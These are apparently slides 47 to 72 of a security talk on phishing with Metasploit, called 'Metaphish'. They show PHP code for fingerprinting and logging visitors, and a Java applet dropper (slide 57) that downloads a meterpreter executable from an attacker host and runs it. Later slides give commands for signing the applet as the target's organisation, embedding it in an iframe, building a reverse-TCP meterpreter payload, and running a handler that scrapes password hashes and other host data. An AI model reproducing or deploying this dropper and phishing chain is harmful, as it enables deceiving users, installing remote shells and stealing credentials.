### Slide: 47
**GATHER BROWSER INFORMATION**

### Slide: 48
**Web Phishing Sieve: Browser Detection Function**
```php
function browserDetect($useragent) {
    // Check for Firefox
    if (preg_match("/Firefox/", $useragent, $winmatched)) {
        $browsertype = "ff";
    } 
    // Check for Internet Explorer
    elseif (preg_match("/MSIE/", $useragent, $winmatched)) {
        $browsertype = "ie";
    } 
    // Check for Safari
    elseif (preg_match("/Safari/", $useragent, $winmatched)) {
        $browsertype = "safari";
    } 
    // Check for Opera
    elseif (preg_match("/Opera/", $useragent, $winmatched)) {
        $browsertype = "opera";
    } 
    // Browser Unknown
    else {
        $browsertype = "unknown";
    }
    return $browsertype;
}
```

### Slide: 49
**GET TARGET’S INTERNAL IP VIA JAVASCRIPT**

### Slide: 50
**Web Phishing Sieve: JavaScript to Decloak IP**
```php
function jsDecloakIP() {
    echo '<script>document.write("Your internal IP is: " + getInternalIP());</script>';
}

function getInternalIP() {
    // JavaScript code to get the internal IP
    // This is a placeholder for actual implementation
    return "192.168.1.100"; // Example IP
}
```

### Slide: 51
**GET INTERNAL IP VIA JAVA APPLET**

### Slide: 52
**Web Phishing Sieve: Java Applet to Get Internal IP**
```java
public class Japdip {
    public static void main(String[] args) {
        System.out.println("Getting internal IP via Java Applet...");
        // Java code to get the internal IP
        // This is a placeholder for actual implementation
    }
}
```
For more information about the class file, visit: [http://www.reglos.de/myaddress/MyAddress.html](http://www.reglos.de/myaddress/MyAddress.html)

### Slide: 53
**LOG ALL RELEVANT INFORMATION**

### Slide: 54
**Web Phishing Sieve: Logging Function**
```php
function logger($target_ip, $dip, $ost, $bt, $sipf, $hitdate) {
    $nl = "\n";
    $delim = "|";
    $data = $target_ip . $delim . $dip . $delim . $ost . $delim . $bt . $delim . $sipf . $delim . $hitdate . $nl;
    $outFile = "clientlog.txt";
    $fh = fopen($outFile, 'a') or die("Cannot open logfile");
    fwrite($fh, $data);
    fclose($fh);
}
```

### Slide: 55
**DEMO: EXAMPLE PAGE**
- **Note:** Normally, you wouldn't display this output.
- **Functionality:** Shows all the acquired target data.

### Slide: 56
**Web Phishing: Social Engineering**
- **Java Applet for Distributing and Executing Meterpreter:**
  - Client visits the page.
  - A Java applet window pops up.
  - Client clicks "Run."
  - The applet downloads the meterpreter executable from your site in the background.
  - The applet executes the meterpreter.
  - Meterpreter sends a reverse shell to your server.

### Slide: 57
**Web Phishing – Dropper/Exec**
```java
import java.applet.Applet;
import java.io.*;
import java.net.*;

public class WebDispApp extends Applet {
    public WebDispApp() { }

    public void init() {
        downloadURL();
        cmd();
    }

    public void downloadURL() {
        OutputStream out = null;
        URLConnection conn = null;
        InputStream in = null;
        try {
            URL url = new URL("http://192.168.1.1/data/win/met.exe");
            out = new BufferedOutputStream(new FileOutputStream("c:\\met.exe"));
            conn = url.openConnection();
            in = conn.getInputStream();
            byte[] buffer = new byte[1024];
            int numRead;
            long numWritten = 0;
            while ((numRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, numRead);
                numWritten += numRead;
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (in != null) in.close();
                if (out != null) out.close();
            } catch (IOException ioe) { }
        }
    }

    public void cmd() {
        Process process;
        try {
            process = Runtime.getRuntime().exec("cmd.exe /c c:\\met.exe");
        } catch (IOException ioexception) { }
    }
}
```

### Slide: 58
**Web Phishing – Dropper/Exec: Enhancing Effectiveness**
- **Use Cryptographically Signed Java Applet:**
  - Sign it as your target.
  - Users read the certificate and trust it (usually).
  - Many sites have invalid certificates, so users often don't notice.
- **Change Filenames and Code:**
  - Reflect the target's application infrastructure.
  - For example, if they use WordPress, use WordPress-sounding filenames.

### Slide: 59
**Web Phishing – Dropper/Exec: Compilation and Signing**
- **Compile the Applet:**
  - `javac MetaPhish.java`
- **Generate a Class File:**
  - `jar -cf MetaPhish.jar MetaPhish.class`
- **Build a Keystore and Set Passwords/Organization Name:**
  - `keytool -genkey -alias signFiles -keystore msfkeystore -storepass msfstorepass -dname "cn=The Targets Org" -keypass msfkeypass`
- **Sign the Files and Create a “Secured” Jar:**
  - `jarsigner -keystore msfkeystore -storepass msfstorepass -keypass msfkeypass -signedjar sMetaPhish.jar MetaPhish.jar signFiles`
- **Create the Certificate:**
  - `keytool -export -keystore msfkeystore -storepass msfstorepass -alias signFiles -file MetaPhishLLC.cer`
- **Import the Certificate:**
  - `keytool -import -alias company -file MetaPhishLLC.cer -keystore msfkeystore -storepass msfstorepass`

### Slide: 60
**Web Phishing – Dropper/Exec: File Collection**
- **Compiled Java:**
  - `MetaPhish.class`
- **Compressed Class:**
  - `MetaPhish.jar`
- **Source Code:**
  - `MetaPhish.java`
- **Certificate:**
  - `MetaPhishLLC.cer`
- **Key Store:**
  - `msfkeystore`
- **Signed Jar:**
  - `sMetaPhish.jar`
- **Malicious Web Page:**
  - `windex.html`

### Slide: 61
**Web Phishing – Dropper/Exec: Web Code to Execute the Applet**
- **Embed the Applet in an IFRAME with a Valid Website:**
  - This tricks the target into running the applet.

### Slide: 62
**Web Phishing – Dropper/Exec: Victim Interaction**
- **Victim Receives Message Box:**
  - The digital signature will appear to have "trusted" information.
  - Many users will run this, making it a form of social engineering or targeted phishing.

### Slide: 63
**Automation**

### Slide: 64
**MSF Multi-Handler / Automation**
- **Handle Multiple Incoming Sessions:**
  - Automate functions such as acquiring passwords, adding users, uploading second-stage persistence backdoors, and accessing registry/stored info.
  - Use firewall-allowed egress ports.

### Slide: 65
**MSF Multi-Handler / Automation: Creating a Standalone Meterpreter Binary**
- **Reverse Connection:**
  - `./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.34 LPORT=8000 R | ./msfencode -b '' -t exe -o meterpreter.exe`

### Slide: 66
**MSF Multi-Handler / Automation: Setting Up Metasploit**
- **Run Metasploit:**
  - `./msfconsole`
- **Set Parameters:**
  - `use exploit/multi/handler`
  - `set ExitOnSession false`
  - `set PAYLOAD windows/meterpreter/reverse_tcp`
  - `set LHOST 192.168.0.34`
  - `set LPORT 8000`

### Slide: 67
**MSF Multi-Handler / Automation: Setting Up Automation Script**
- **Set Automation Script:**
  - `set AutoRunScript ./PhishScrape.rb`
- **Start Exploit:**
  - `exploit -j`

### Slide: 68
**MSF Multi-Handler / Automation: Deployment Methods**
- **Deploy Meterpreter:**
  - Infected PDF/files
  - Malicious website
  - Java Applet
  - Email

### Slide: 69
**MSF Multi-Handler / Automation: Monitoring**
- **Watch for:**
  - `[*] Transmitting intermediate stager for over-sized stage...(191 bytes)`
- **List Sessions:**
  - `sessions -l`
- **Use Standard Meterpreter Commands:**

### Slide: 70
**MSF Multi-Handler / Automation: Automated Scrapper**
- **Gathered Information:**
  - `env.txt` (System environment)
  - `group.txt` (Domain group info)
  - `hashes.txt` (Crackable password hashes)
  - `localgroup.txt` (Local group memberships)
  - `nethood.txt` (Network neighborhood info)
  - `network.txt` (Detailed networking info)
  - `services.txt` (Running services, look for AV)
  - `shares.txt` (Shared directories)
  - `system.txt` (Operating system info)
  - `users.txt` (Local user account names)
- **For More Ideas:**
  - Visit [http://www.darkoperator.com/](http://www.darkoperator.com/)

### Slide: 71
**Metaphish: Demo**

### Slide: 72
**Who Do You Want to Be Today?**
- **Abusing Tor**